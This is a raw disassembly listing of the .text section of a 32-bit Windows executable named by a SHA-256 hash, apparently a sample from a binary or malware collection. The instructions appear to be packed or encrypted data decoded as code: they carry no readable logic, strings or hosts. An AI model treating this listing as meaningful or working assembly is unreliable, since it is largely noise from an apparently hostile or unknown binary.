
8734ff9a39152b82e61dd473332d291bbcc495a11468e820a632ce4a5006c750.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	adc    BYTE PTR [esp+eax*1],ah
  401003:	push   ecx
  401004:	cmp    al,BYTE PTR [eax]
  401006:	add    BYTE PTR [eax],al
  401008:	inc    ecx
  401009:	push   ecx
  40100a:	adc    al,al
  40100c:	mov    al,ds:0x2c10df
  401011:	push   es
  401012:	adc    DWORD PTR [eax],edx
  401014:	adc    DWORD PTR [edx],eax
  401016:	or     eax,ebx
  401018:	and    BYTE PTR [ecx+edx*1],al
  40101b:	dec    ebp
  40101c:	or     ah,dh
  40101e:	add    DWORD PTR [eax+0x4002212c],eax
  401024:	add    BYTE PTR [ecx],ah
  401026:	adc    ch,BYTE PTR [ecx+0x44f41]
  40102c:	inc    ebx
  40102d:	loopne 0x40103b
  40102f:	dec    eax
  401030:	xor    BYTE PTR [esi+0x10471102],dl
  401036:	and    al,0x4
  401038:	and    al,0x24
  40103a:	add    bl,BYTE PTR [eax+0xa]
  40103d:	les    ecx,FWORD PTR ds:0xc241e21
  401043:	mov    eax,ds:0x5ba80081
  401048:	add    eax,0x11474
  40104d:	push   cs
  40104e:	add    DWORD PTR [ebx],esp
  401050:	add    BYTE PTR [eax+0x41],al
  401053:	inc    edx
  401054:	and    BYTE PTR [eax+0x4c],dl
  401057:	add    BYTE PTR [esi],al
  401059:	add    al,BYTE PTR [eax]
  40105b:	inc    eax
  40105c:	mov    BYTE PTR [ebx+eiz*1+0x24a8060d],0x2
  401064:	sub    BYTE PTR [edx+0x2a318804],al
  40106a:	inc    edx
  40106b:	les    ecx,FWORD PTR [eax]
  40106d:	push   es
  40106e:	or     DWORD PTR [edx+0x25],eax
  401071:	ret    0x940b
  401074:	adc    BYTE PTR [edx+edx*4-0x5e],bl
  401078:	inc    eax
  401079:	add    BYTE PTR [eax],al
  40107b:	test   DWORD PTR [eax+ebx*4],edx
  40107e:	dec    edx
  40107f:	sbb    ah,BYTE PTR [eax]
  401081:	lods   eax,DWORD PTR ds:[esi]
  401082:	rol    DWORD PTR [ecx],0x0
  401085:	mov    al,0x41
  401087:	add    BYTE PTR [esp+eax*8+0x32004027],al
  40108e:	push   ss
  40108f:	add    DWORD PTR [ecx],0x48
  401092:	xchg   esp,eax
  401093:	sbb    BYTE PTR [eax-0x5dff7f8],al
  401099:	enter  0xd002,0xf0
  40109d:	add    DWORD PTR [ebp+0x0],ebp
  4010a0:	push   esp
  4010a1:	sub    DWORD PTR [eax],edi
  4010a3:	adc    BYTE PTR [eax],0x0
  4010a6:	add    BYTE PTR [eax+0x30],0x4
  4010aa:	je     0x4010ac
  4010ac:	and    BYTE PTR [ecx+0x984193],al
  4010b2:	adc    BYTE PTR [eax],al
  4010b4:	inc    eax
  4010b5:	mov    BYTE PTR [eax],al
  4010b7:	mov    cl,0x1b
  4010b9:	add    al,0xca
  4010bb:	nop
  4010bc:	test   al,0x10
  4010be:	adc    DWORD PTR [edi],edx
  4010c0:	mov    WORD PTR [eax],es
  4010c2:	sub    BYTE PTR [edi],al
  4010c4:	cmp    dh,BYTE PTR [ecx]
  4010c6:	inc    edx
  4010c7:	nop
  4010c8:	add    BYTE PTR [eax+0x39022190],0xc6
  4010cf:	pop    es
  4010d0:	or     ch,cl
  4010d2:	add    esp,DWORD PTR [edx]
  4010d4:	and    ah,BYTE PTR [eax+0x37]
  4010d7:	dec    esi
  4010d8:	push   ebp
  4010d9:	adc    BYTE PTR [edx],al
  4010db:	or     BYTE PTR [esi],al
  4010dd:	or     ecx,esp
  4010df:	and    dl,BYTE PTR [edx]
  4010e1:	dec    ecx
  4010e2:	add    DWORD PTR [eax+0x2],ecx
  4010e5:	rcl    BYTE PTR ds:0x12082804,1
  4010eb:	sub    BYTE PTR [edx+0x30],al
  4010ee:	and    BYTE PTR [eax],bl
  4010f0:	add    BYTE PTR [edx],dl
  4010f2:	add    BYTE PTR [eax],al
  4010f4:	add    DWORD PTR [eax+0x40],esp
  4010f7:	inc    eax
  4010f8:	add    BYTE PTR [ecx],al
  4010fa:	bound  ebx,QWORD PTR [eax]
  4010fc:	and    ah,BYTE PTR [edx]
  4010fe:	push   eax
  4010ff:	test   BYTE PTR [ecx+0x44],al
  401102:	mov    DWORD PTR [eax],ecx
  401104:	test   BYTE PTR [eax],al
  401106:	push   ecx
  401107:	inc    ebp
  401108:	sbb    BYTE PTR [edx],0x43
  40110b:	adc    BYTE PTR [eax],cl
  40110d:	add    DWORD PTR [edx],eax
  40110f:	cmp    BYTE PTR [edx+0x6a800031],0x8
  401116:	cmp    al,0x36
  401118:	or     BYTE PTR [edx+eax*1],al
  40111b:	add    al,0x0
  40111d:	bound  eax,QWORD PTR [eax]
  40111f:	add    al,0x84
  401121:	inc    esp
  401122:	add    BYTE PTR [ecx],cl
  401124:	push   ecx
  401125:	adc    al,0x22
  401127:	add    al,BYTE PTR ds:0x61ec819
  40112d:	and    al,0x9
  40112f:	add    BYTE PTR [eax],al
  401131:	push   ss
  401132:	or     BYTE PTR [eax],dh
  401134:	add    ah,BYTE PTR [eax+0x802889]
  40113a:	push   cs
  40113b:	sbb    BYTE PTR [ecx],0x1c
  40113e:	ret    0x2000
  401141:	add    DWORD PTR [eax],ecx
  401143:	add    eax,DWORD PTR [eax+0x4f]
  401146:	sbb    edx,DWORD PTR [eax-0x1f]
  401149:	inc    ebp
  40114a:	add    BYTE PTR [eax],al
  40114c:	add    eax,DWORD PTR [eax]
  40114e:	push   ecx
  40114f:	push   eax
  401150:	pusha  
  401151:	add    al,BYTE PTR [ecx+0x6180206]
  401157:	or     BYTE PTR [eax-0x7f7ff7ee],ch
  40115d:	adc    BYTE PTR [ecx-0x73df9fda],al
  401163:	mov    al,ds:0x8b02441e
  401168:	test   BYTE PTR [eax],al
  40116a:	ror    BYTE PTR [eax],0x4c
  40116d:	or     eax,0x50a04021
  401172:	xchg   edx,eax
  401173:	add    BYTE PTR [ecx],ah
  401175:	add    al,BYTE PTR [edx]
  401177:	xor    BYTE PTR [ecx+0x4307e2],al
  40117d:	inc    esi
  40117e:	add    ah,BYTE PTR [edx]
  401180:	les    eax,FWORD PTR [ebx]
  401182:	add    DWORD PTR [eax],eax
  401184:	adc    edx,DWORD PTR [ebx]
  401186:	add    DWORD PTR [eax+0x74],0xa292904
  40118d:	and    al,BYTE PTR ss:[eax-0x80]
  401191:	cmp    DWORD PTR [eax],eax
  401193:	rcl    BYTE PTR [eax],0x6
  401196:	out    0x10,eax
  401198:	add    BYTE PTR [eax],dh
  40119a:	sbb    dl,BYTE PTR [eax+0xc]
  40119d:	add    DWORD PTR ds:0x458109a2,ecx
  4011a3:	pusha  
  4011a4:	mov    ecx,0x2000200
  4011a9:	add    DWORD PTR [eax+0x50],esp
  4011ac:	ror    BYTE PTR [eax],0x8
  4011af:	adc    cl,0x3
  4011b2:	adc    al,0x3
  4011b4:	xchg   edx,eax
  4011b5:	add    al,BYTE PTR [eax-0x75ef51e0]
  4011bb:	adc    BYTE PTR [eax],0x0
  4011be:	and    BYTE PTR [edx],ah
  4011c0:	add    DWORD PTR [eax+0x50211047],ecx
  4011c6:	and    BYTE PTR [eax],al
  4011c8:	pusha  
  4011c9:	mov    DWORD PTR ds:0x12046,eax
  4011cf:	and    cl,BYTE PTR [esp+eax*1]
  4011d2:	adc    BYTE PTR [eax],dl
  4011d4:	add    al,0x0
  4011d6:	pusha  
  4011d7:	add    ch,BYTE PTR [eax+0x68]
  4011da:	mov    al,ds:0xd284cf
  4011df:	add    DWORD PTR [eax+0x0],0x1c28804
  4011e6:	loopne 0x40122a
  4011e8:	and    ah,ch
  4011ea:	mov    ds:0x160c0020,al
  4011ef:	mov    WORD PTR [esp+edx*2+0x9],fs
  4011f3:	add    ah,BYTE PTR [edx+eax*1+0x18048519]
  4011fa:	add    BYTE PTR [esi-0x7e],0x88
  4011fe:	add    BYTE PTR [eiz*1+0x2db0283],cl
  401205:	xor    ah,BYTE PTR [eax+0x68019012]
  40120b:	mov    ds:0x80040841,al
  401210:	add    DWORD PTR [edx],ecx
  401212:	sub    BYTE PTR [eax+0x4],al
  401215:	adc    BYTE PTR [eax+0x42],dl
  401218:	inc    edx
  401219:	push   ecx
  40121a:	pop    es
  40121b:	dec    edi
  40121c:	add    BYTE PTR [esi],bl
  40121e:	and    BYTE PTR [ecx+0x2],ch
  401221:	xchg   ebx,eax
  401222:	test   al,0x61
  401224:	add    BYTE PTR [ecx+0x46021800],bl
  40122a:	or     BYTE PTR [edx],al
  40122c:	add    al,0x8
  40122e:	inc    eax
  40122f:	sbb    eax,DWORD PTR [eax]
  401231:	or     al,0x36
  401233:	inc    ebp
  401234:	adc    BYTE PTR [edx-0x60],al
  401237:	inc    ebx
  401238:	inc    ecx
  401239:	or     al,BYTE PTR [ecx+0x25]
  40123c:	adc    BYTE PTR [eax],al
  40123e:	add    DWORD PTR [eax+0x40],eax
  401241:	xchg   ecx,eax
  401242:	add    DWORD PTR [eax-0x71],0xffffff8a
  401246:	xor    BYTE PTR [eax],al
  401248:	add    BYTE PTR [ebx+0x8],cl
  40124b:	adc    BYTE PTR [ebp+0x1],0x3a
  40124f:	add    esp,DWORD PTR [edx-0x31e7dce0]
  401255:	test   BYTE PTR [eax-0x5c],ch
  401258:	add    BYTE PTR [edi+eax*2-0x38ff97fa],al
  40125f:	sub    al,0x2
  401261:	adc    BYTE PTR [eax],al
  401263:	mov    dl,0x0
  401265:	and    BYTE PTR [eax+0x4d900004],al
  40126b:	add    BYTE PTR [ebx+ecx*2-0x7deecd00],al
  401272:	add    al,0xac
  401274:	sub    al,BYTE PTR [eax+0x60]
  401277:	test   BYTE PTR [edx-0x76fff9de],al
  40127d:	adc    BYTE PTR [edx+eax*8],cl
  401280:	push   0x10004a04
  401285:	push   ecx
  401286:	nop
  401287:	and    al,0x11
  401289:	or     BYTE PTR [esi+0x46],cl
  40128c:	add    BYTE PTR [ecx],cl
  40128e:	test   DWORD PTR [eax+ebp*8],ecx
  401291:	or     BYTE PTR [ecx],cl
  401293:	add    al,BYTE PTR [eax+eax*1+0x4b0825]
  40129a:	sbb    BYTE PTR [eax],al
  40129c:	adc    eax,0x800a1042
  4012a1:	add    BYTE PTR [eax],0x92
  4012a4:	dec    esi
  4012a5:	mov    bh,0x4e
  4012a7:	mov    dh,0xac
  4012a9:	daa    
  4012aa:	and    ah,BYTE PTR [ecx+0xa]
  4012ad:	and    BYTE PTR [eax],ah
  4012af:	les    esp,FWORD PTR [ecx]
  4012b1:	add    BYTE PTR [ecx+eax*1-0x5ef7b0ff],al
  4012b8:	adc    al,0x2
  4012ba:	xchg   BYTE PTR [eax+0x42],cl
  4012bd:	mov    DWORD PTR [edx+0x62b00318],eax
  4012c3:	mov    ah,BYTE PTR [edx+0x8293108]
  4012c9:	and    al,0x6
  4012cb:	inc    esp
  4012cc:	and    dl,bl
  4012ce:	or     DWORD PTR [eax],edx
  4012d0:	inc    edx
  4012d1:	sbb    BYTE PTR [ecx],al
  4012d3:	mov    al,ds:0x9005540
  4012d8:	pusha  
  4012d9:	dec    esi
  4012da:	xor    BYTE PTR ds:0x2800130,ch
  4012e0:	push   ss
  4012e1:	push   ss
  4012e2:	inc    edx
  4012e3:	or     eax,0x52c68002
  4012e8:	sbb    BYTE PTR [edx+eax*1],dl
  4012eb:	loopne 0x401316
  4012ed:	loopne 0x401279
  4012ef:	adc    BYTE PTR [eax],dl
  4012f1:	xchg   BYTE PTR [edx+0x0],ch
  4012f4:	or     al,0x20
  4012f6:	shl    al,1
  4012f8:	add    dh,BYTE PTR [eax+0xcc83000]
  4012fe:	sbb    BYTE PTR [edi],ah
  401300:	dec    eax
  401301:	pop    ebx
  401302:	add    al,0x0
  401304:	adc    BYTE PTR [edx+0x1],ch
  401307:	xor    al,BYTE PTR [ecx+eax*1]
  40130a:	and    BYTE PTR [eax],dl
  40130c:	inc    edx
  40130d:	mov    BYTE PTR [eax],bl
  40130f:	adc    BYTE PTR [ecx],al
  401311:	add    BYTE PTR ds:0x3312054,al
  401317:	jp     0x40129d
  401319:	add    BYTE PTR [eax],bl
  40131b:	add    BYTE PTR [eax-0x6fdfb6e7],al
  401321:	rol    BYTE PTR [eax],0x70
  401324:	loopne 0x4012a6
  401326:	and    BYTE PTR [eax-0x7dbdb6c0],al
  40132c:	adc    BYTE PTR [edx+0x56],al
  40132f:	mov    cl,0xc0
  401331:	gs dec eax
  401333:	or     DWORD PTR [edx-0x7c],esp
  401336:	add    al,BYTE PTR [eax]
  401338:	add    bh,BYTE PTR [ecx+0x14]
  40133b:	add    DWORD PTR [eax],eax
  40133d:	add    bl,BYTE PTR [eax+0x40]
  401340:	add    DWORD PTR [eax+0x60],ecx
  401343:	add    al,BYTE PTR [eax]
  401345:	adc    BYTE PTR [ebx],dl
  401347:	and    BYTE PTR [edx],dl
  401349:	or     eax,0x3430c802
  40134e:	mov    al,0x9
  401350:	xor    BYTE PTR [edx+0x49012408],cl
  401356:	or     DWORD PTR [edx+0x6618b2],ecx
  40135c:	or     BYTE PTR [eax],dl
  40135e:	add    bl,BYTE PTR [ebx]
  401360:	adc    BYTE PTR [eax],bl
  401362:	add    BYTE PTR [ecx-0x6f7ee3f0],ah
  401368:	sbb    DWORD PTR [eax+0x60],eax
  40136b:	adc    BYTE PTR [eax],al
  40136d:	mov    al,ds:0x507148a4
  401372:	and    BYTE PTR [ecx+0xa],ch
  401375:	loope  0x401337
  401377:	sbb    BYTE PTR [ecx+0x1402d082],ah
  40137d:	pusha  
  40137e:	and    al,BYTE PTR [edx]
  401380:	dec    ebp
  401381:	inc    eax
  401382:	or     BYTE PTR [eax],0x6
  401385:	xor    BYTE PTR [esp+edx*4-0x6f9ffbf8],0xa3
  40138d:	or     eax,0x11681840
  401392:	add    al,BYTE PTR gs:[edx+0x2109]
  401399:	test   ah,ah
  40139b:	cmp    DWORD PTR [edx],eax
  40139d:	cs add eax,0x989c0213
  4013a3:	add    BYTE PTR [ecx+0x11],al
  4013a6:	and    BYTE PTR [eax],0x18
  4013a9:	add    BYTE PTR [edx],ah
  4013ab:	add    DWORD PTR [eax],eax
  4013ad:	push   esp
  4013ae:	adc    al,0x2
  4013b0:	push   ebp
  4013b1:	or     al,0x54
  4013b3:	add    al,0x44
  4013b5:	mov    cl,al
  4013b7:	sbb    al,0x11
  4013b9:	mov    al,0x41
  4013bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013bc:	and    cl,0xe8
  4013bf:	adc    BYTE PTR [ecx-0x67f5ffbb],al
  4013c5:	mov    ah,0xd0
  4013c7:	add    dl,BYTE PTR [eax+0x40]
  4013ca:	adc    al,dl
  4013cc:	rol    DWORD PTR [esp+edx*4+0x0],0x50
  4013d1:	add    BYTE PTR [eax-0x80],bh
  4013d4:	adc    al,ah
  4013d6:	add    al,0x6a
  4013d8:	add    DWORD PTR [eax+esi*1],eax
  4013db:	add    DWORD PTR [eax+0x50],0x10
  4013df:	inc    eax
  4013e0:	dec    ebx
  4013e1:	sbb    BYTE PTR [eax],dl
  4013e3:	xor    BYTE PTR [eax+0x4c],dl
  4013e6:	jge    0x4013e8
  4013e8:	pop    ecx
  4013e9:	add    esp,DWORD PTR [edx]
  4013eb:	add    DWORD PTR [eax],ebx
  4013ed:	add    al,0x82
  4013ef:	and    al,0x4
  4013f1:	add    BYTE PTR [eax+0x1e30c408],dl
  4013f7:	sbb    DWORD PTR [eax+0x46],esp
  4013fa:	pop    edi
  4013fb:	ret    0x2048
  4013fe:	inc    eax
  4013ff:	add    al,0x12
  401401:	and    DWORD PTR [eax-0x5ffdfd60],0x82026820
  40140b:	inc    edx
  40140c:	and    eax,0x46811784
  401411:	inc    eax
  401412:	ret    0x0
  401415:	mov    eax,0x7080000
  40141a:	nop
  40141b:	add    DWORD PTR [ebx],eax
  40141d:	add    eax,DWORD PTR [eax+eax*1-0x3c]
  401421:	repnz add al,0x13
  401424:	add    BYTE PTR [edx+0x23],al
  401427:	add    al,0x8f
  401429:	in     al,dx
  40142a:	lock sbb al,0x3
  40142d:	popa   
  40142e:	dec    eax
  40142f:	ret    0x5003
  401432:	xor    eax,DWORD PTR [ebx]
  401434:	and    DWORD PTR [eax],eax
  401436:	mov    bl,BYTE PTR [eax+0x45a160]
  40143c:	or     al,0x98
  40143e:	add    BYTE PTR [eax],cl
  401440:	and    DWORD PTR [ebx],ecx
  401442:	sbb    BYTE PTR [esp+eax*1-0x6ebcfbc0],al
  401449:	test   eax,0x440a2700
  40144e:	adc    BYTE PTR [edx-0x5f],ah
  401451:	mov    al,al
  401453:	or     esi,DWORD PTR [eax]
  401455:	or     BYTE PTR [eax],dh
  401457:	or     BYTE PTR [eax],ah
  401459:	popa   
  40145a:	or     BYTE PTR [eax+eax*8],0xa
  40145e:	add    BYTE PTR [edx],al
  401460:	or     al,0x92
  401462:	add    BYTE PTR [edx],al
  401464:	sbb    ch,BYTE PTR [eax]
  401466:	or     DWORD PTR [eax],edx
  401468:	or     BYTE PTR [ebx],al
  40146a:	add    BYTE PTR [edx-0x5dabfd60],al
  401470:	add    BYTE PTR [eax],cl
  401472:	inc    eax
  401473:	inc    ebx
  401474:	add    BYTE PTR [edx],al
  401476:	and    edx,DWORD PTR [ebx]
  401478:	inc    eax
  401479:	add    al,0x10
  40147b:	add    BYTE PTR [eax],al
  40147d:	and    al,0x22
  40147f:	inc    ebp
  401480:	sub    BYTE PTR [eax+0x0],al
  401483:	and    al,0xcb
  401485:	add    BYTE PTR [edx],al
  401487:	inc    esp
  401488:	xchg   BYTE PTR [eax+edx*1],bl
  40148b:	inc    ecx
  40148c:	add    BYTE PTR [eax],ah
  40148e:	cmp    DWORD PTR [ecx+eiz*2],0x9345282
  401495:	or     DWORD PTR [eax],eax
  401497:	sbb    dh,BYTE PTR [ecx-0x7c]
  40149a:	sub    BYTE PTR [eax],0x20
  40149d:	or     BYTE PTR [ecx+0x62840000],ah
  4014a3:	push   0x11212660
  4014a8:	mov    BYTE PTR [ecx+0x25],0x80
  4014ac:	sub    eax,DWORD PTR [ecx]
  4014ae:	add    BYTE PTR [edx+0x4c429005],ah
  4014b4:	inc    eax
  4014b5:	add    BYTE PTR [ebx+eax*2],al
  4014b8:	sub    DWORD PTR gs:[eax],ecx
  4014bb:	add    BYTE PTR [ecx+ebp*1],al
  4014be:	add    BYTE PTR [eax+0x6c],dh
  4014c1:	add    BYTE PTR [eax],dh
  4014c3:	adc    cl,BYTE PTR [edx-0x4e]
  4014c6:	test   al,0x0
  4014c8:	loopne 0x40144e
  4014ca:	or     DWORD PTR [esi],eax
  4014cc:	add    BYTE PTR [ecx],0x47
  4014cf:	add    BYTE PTR [eax],al
  4014d1:	cwde   
  4014d2:	mov    BYTE PTR [eax-0x40],al
  4014d5:	add    BYTE PTR [eax],dl
  4014d7:	and    al,BYTE PTR [eax+0x22860958]
  4014dd:	sub    BYTE PTR [esi+0x28900204],0x28
  4014e4:	add    DWORD PTR [eax],esp
  4014e6:	or     BYTE PTR [eax],al
  4014e8:	and    cl,BYTE PTR [eax+eax*1+0x0]
  4014ec:	mov    WORD PTR [eax],es
  4014ee:	test   BYTE PTR [ecx+0x58],ah
  4014f1:	add    BYTE PTR [esi+0x9000042],al
  4014f7:	bound  edx,QWORD PTR ds:0x540860
  4014fd:	inc    ecx
  4014fe:	inc    eax
  4014ff:	rol    DWORD PTR [eax],0x8
  401502:	push   es
  401503:	inc    edx
  401504:	and    BYTE PTR [eax+ebx*2],bl
  401507:	pop    esi
  401508:	add    DWORD PTR [eax+0x2],edi
  40150b:	add    al,BYTE PTR [esi]
  40150d:	add    BYTE PTR fs:[ecx],al
  401510:	inc    eax
  401511:	rol    BYTE PTR ds:0x1c00b19e,0x10
  401518:	add    al,0x81
  40151a:	add    al,BYTE PTR [ecx+0x20220090]
  401520:	or     BYTE PTR [ebp+0x20],cl
  401523:	mov    al,ds:0x4f380024
  401528:	add    BYTE PTR [eax],bh
  40152a:	or     DWORD PTR [eax],eax
  40152c:	adc    eax,DWORD PTR [eax]
  40152e:	add    BYTE PTR [esi+0x21802420],al
  401534:	xor    ah,BYTE PTR [ecx]
  401536:	adc    al,0x24
  401538:	add    al,0x70
  40153a:	add    BYTE PTR [esi+0x25],dh
  40153d:	and    al,BYTE PTR [eax-0x5efb7dd]
  401543:	add    DWORD PTR [ebx+0xd40120],eax
  401549:	add    eax,0xa248a002
  40154e:	inc    eax
  40154f:	mov    ds:0x7a540124,al
  401554:	push   esp
  401555:	and    DWORD PTR [eax],esp
  401557:	pop    eax
  401558:	inc    eax
  401559:	sub    BYTE PTR [edx],al
  40155b:	(bad)
  40155e:	push   es
  40155f:	test   BYTE PTR [ecx+0x8200122],al
  401565:	add    BYTE PTR [ebx+0x60],ah
  401568:	inc    esp
  401569:	adc    BYTE PTR [ebx+0x20],bl
  40156c:	add    DWORD PTR [eax-0x4ffb7ec0],eax
  401572:	push   eax
  401573:	or     BYTE PTR [eax+0x3e292949],0x88
  40157a:	pop    ss
  40157b:	add    BYTE PTR [ebx-0x751fd7b0],ch
  401581:	xor    BYTE PTR [ecx+0x1408029],al
  401587:	adc    eax,0xa594408b
  40158c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40158d:	test   BYTE PTR [eax],ch
  40158f:	push   eax
  401590:	add    cl,BYTE PTR [ebx]
  401592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401593:	dec    esp
  401594:	push   esp
  401595:	add    BYTE PTR cs:[eax],0x40
  401599:	or     BYTE PTR [edx+ebx*1],al
  40159c:	xchg   esp,eax
  40159d:	and    dl,cl
  40159f:	dec    edx
  4015a0:	add    BYTE PTR [ebx],cl
  4015a2:	pusha  
  4015a3:	adc    BYTE PTR [esi+eiz*1],al
  4015a6:	add    DWORD PTR [eax-0x7fab78e0],ecx
  4015ac:	or     DWORD PTR [ecx],ecx
  4015ae:	adc    DWORD PTR [ecx],ecx
  4015b0:	adc    DWORD PTR [ecx],ecx
  4015b2:	pusha  
  4015b3:	sbb    BYTE PTR [ebx+0x4],al
  4015b6:	inc    ebp
  4015b7:	push   es
  4015b8:	add    ah,BYTE PTR [eax]
  4015ba:	adc    ah,BYTE PTR [edx+eax*8+0x2b6820]
  4015c1:	or     al,BYTE PTR [edx]
  4015c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015c4:	or     DWORD PTR [eax-0x7fffbffd],eax
  4015ca:	sbb    BYTE PTR [edi],al
  4015cc:	and    BYTE PTR ds:0x10a20090,0xa0
  4015d3:	add    DWORD PTR [eax+ecx*4],0x82460a3
  4015da:	dec    eax
  4015db:	adc    dh,BYTE PTR [eax]
  4015dd:	add    al,0x9
  4015df:	add    BYTE PTR [eax],dh
  4015e1:	test   eax,0xc33805
  4015e6:	add    DWORD PTR [esp+eax*1+0x50],esp
  4015ea:	adc    BYTE PTR [ecx],bl
  4015ec:	sub    al,0x22
  4015ee:	aam    0x4
  4015f0:	push   ebp
  4015f1:	or     eax,0x83000f02
  4015f6:	and    BYTE PTR [eax],dl
  4015f8:	inc    esi
  4015f9:	inc    ecx
  4015fa:	add    DWORD PTR [edx],0x80013110
  401600:	add    BYTE PTR [eax],al
  401602:	push   ecx
  401603:	xor    DWORD PTR [ebx+0x984021],eax
  401609:	cwde   
  40160a:	adc    al,0x89
  40160c:	and    eax,DWORD PTR [eax]
  40160e:	or     al,BYTE PTR [edx]
  401610:	add    BYTE PTR [edx],al
  401612:	inc    edx
  401613:	pop    es
  401614:	cmp    BYTE PTR [edx+0x22],cl
  401617:	add    eax,0x28081404
  40161c:	xor    BYTE PTR [eax+eax*2+0x61],dl
  401620:	nop
  401621:	or     BYTE PTR ds:0x904400,al
  401627:	and    esp,ecx
  401629:	and    cl,BYTE PTR [eax+0x0]
  40162c:	or     esp,DWORD PTR [eax]
  40162e:	and    al,0x40
  401630:	xor    al,0x20
  401632:	xor    eax,edx
  401634:	mov    DWORD PTR [ecx],eax
  401636:	arpl   WORD PTR [eax-0x3ffffff3],ax
  40163c:	sub    al,0x80
  40163e:	inc    ecx
  40163f:	nop
  401640:	inc    ecx
  401641:	xchg   DWORD PTR [eax+0x1048903],ecx
  401647:	and    BYTE PTR [ecx-0x7e],al
  40164a:	or     ah,BYTE PTR [ecx-0x5f]
  40164d:	mov    ds:0x1020d341,al
  401652:	or     ah,ah
  401654:	add    dl,BYTE PTR [eax+0x9]
  401657:	(bad)  
  401658:	mov    al,ds:0x23400a30
  40165d:	or     BYTE PTR [eax],ch
  40165f:	adc    dl,al
  401661:	add    cl,BYTE PTR [edx]
  401663:	add    dl,BYTE PTR [ecx+eax*4]
  401666:	add    BYTE PTR [eax+eax*4],al
  401669:	add    BYTE PTR [ebx],al
  40166b:	push   es
  40166c:	aam    0xc
  40166e:	jnp    0x4015fa
  401670:	pop    ss
  401671:	add    al,BYTE PTR [eax]
  401673:	and    eax,DWORD PTR [eax+0x0]
  401676:	push   edx
  401677:	push   ss
  401678:	and    BYTE PTR [eax],al
  40167a:	push   cs
  40167b:	add    ah,BYTE PTR [ecx]
  40167d:	mov    cl,BYTE PTR [eax+0xc11840]
  401683:	mov    eax,ds:0x4404420
  401688:	or     DWORD PTR [edx-0x80],edx
  40168b:	imul   eax,DWORD PTR [eax+0x46],0x58802981
  401692:	inc    ecx
  401693:	add    BYTE PTR [eax+0xa500233],al
  401699:	test   BYTE PTR [esi+edx*1-0x6cfd5760],al
  4016a0:	popa   
  4016a1:	inc    eax
  4016a2:	add    BYTE PTR [edx-0x77],bh
  4016a5:	add    al,BYTE PTR [edx+0x48]
  4016a8:	sub    ebx,DWORD PTR [esi]
  4016aa:	add    DWORD PTR [edi-0x58],ecx
  4016ad:	sub    al,0x48
  4016af:	cmp    al,0x48
  4016b1:	or     al,0x28
  4016b3:	add    DWORD PTR [ecx],eax
  4016b5:	adc    DWORD PTR [eax+0x21020080],esp
  4016bb:	or     al,0x2
  4016bd:	adc    ebp,DWORD PTR [ecx+0xb009100]
  4016c3:	add    al,BYTE PTR [eax]
  4016c5:	loope  0x4016c8
  4016c7:	or     BYTE PTR [eax],0xc
  4016ca:	ror    BYTE PTR [eax+0x1],0x0
  4016ce:	add    BYTE PTR [edx],al
  4016d0:	add    DWORD PTR [eax],esp
  4016d2:	inc    eax
  4016d3:	push   edx
  4016d4:	add    edx,esp
  4016d6:	add    cl,ah
  4016d8:	sbb    al,0x40
  4016da:	inc    eax
  4016db:	sub    al,dh
  4016dd:	push   ecx
  4016de:	or     BYTE PTR [ecx+eax*1+0x6e],ch
  4016e2:	icebp  
  4016e3:	stc    
  4016e4:	and    DWORD PTR [eax],ecx
  4016e6:	add    BYTE PTR [ebx+edx*2],al
  4016e9:	adc    DWORD PTR [ebp+0x10],edx
  4016ec:	add    DWORD PTR [eax],esp
  4016ee:	and    BYTE PTR [eax],cl
  4016f0:	add    DWORD PTR [ecx],eax
  4016f2:	sbb    al,0x50
  4016f4:	dec    esp
  4016f5:	mov    DWORD PTR [eax],edx
  4016f7:	jo     0x40167d
  4016f9:	ror    DWORD PTR [eax+eax*1],0x21
  4016fd:	pusha  
  4016fe:	add    eax,0x5a204e08
  401703:	add    BYTE PTR [eax],ch
  401705:	and    BYTE PTR [eax],al
  401707:	or     BYTE PTR [eax-0x7ff07df4],dl
  40170d:	adc    BYTE PTR [eax],al
  40170f:	dec    eax
  401710:	inc    eax
  401711:	add    al,BYTE PTR [ecx+0x20]
  401714:	shl    DWORD PTR [eax],0x3
  401717:	or     al,0x0
  401719:	and    al,0x16
  40171b:	add    BYTE PTR ss:[ecx+0xa],ah
  40171f:	cmp    BYTE PTR [eax],al
  401721:	and    ah,al
  401723:	adc    DWORD PTR [eax],eax
  401725:	inc    edx
  401726:	push   esi
  401727:	xor    BYTE PTR [ecx],bh
  401729:	test   BYTE PTR ds:0x81006464,al
  40172f:	add    DWORD PTR [ecx+ecx*2+0x1],eax
  401733:	mov    eax,ds:0x2e400110
  401738:	inc    ecx
  401739:	adc    eax,0x50120845
  40173e:	nop
  40173f:	jge    0x1646dbd5
  401745:	and    BYTE PTR ss:[eax],al
  401748:	add    BYTE PTR [edx],al
  40174a:	inc    eax
  40174b:	add    cl,BYTE PTR [eax]
  40174d:	inc    ecx
  40174e:	push   es
  40174f:	inc    esi
  401750:	and    BYTE PTR [eax+0x16c34400],ch
  401756:	adc    al,0x41
  401758:	and    al,BYTE PTR [eax+eiz*2]
  40175b:	and    BYTE PTR [eax],ah
  40175d:	add    BYTE PTR [eax+0x3b2c19],al
  401763:	or     BYTE PTR [eax],al
  401765:	add    DWORD PTR [ecx-0x7f],eax
  401768:	and    ah,BYTE PTR [eax+0x60]
  40176b:	adc    BYTE PTR [ecx],ch
  40176d:	add    DWORD PTR [ebp+0x21],ecx
  401770:	add    BYTE PTR [ecx+0x23],al
  401773:	add    al,BYTE PTR [edi]
  401775:	sbb    BYTE PTR [ecx-0x57eb9fb0],0xb0
  40177c:	jae    0x401784
  40177e:	and    BYTE PTR [eax],dl
  401780:	add    BYTE PTR [eax],ah
  401782:	adc    BYTE PTR [edx],dl
  401784:	xchg   edx,eax
  401785:	dec    esp
  401786:	ret    0x2d51
  401789:	adc    DWORD PTR [eax],eax
  40178b:	sbb    eax,0x2005c0c8
  401790:	xchg   DWORD PTR [eax],eax
  401792:	add    DWORD PTR [ecx],ecx
  401794:	pop    ecx
  401795:	dec    eax
  401796:	inc    ebp
  401797:	add    BYTE PTR [eax-0x5f7be6d0],al
  40179d:	or     DWORD PTR [eax+eax*1],esi
  4017a0:	inc    ecx
  4017a1:	and    BYTE PTR [ebp+0x21],bl
  4017a4:	sub    BYTE PTR [eax-0x61],0x10
  4017a8:	dec    ebx
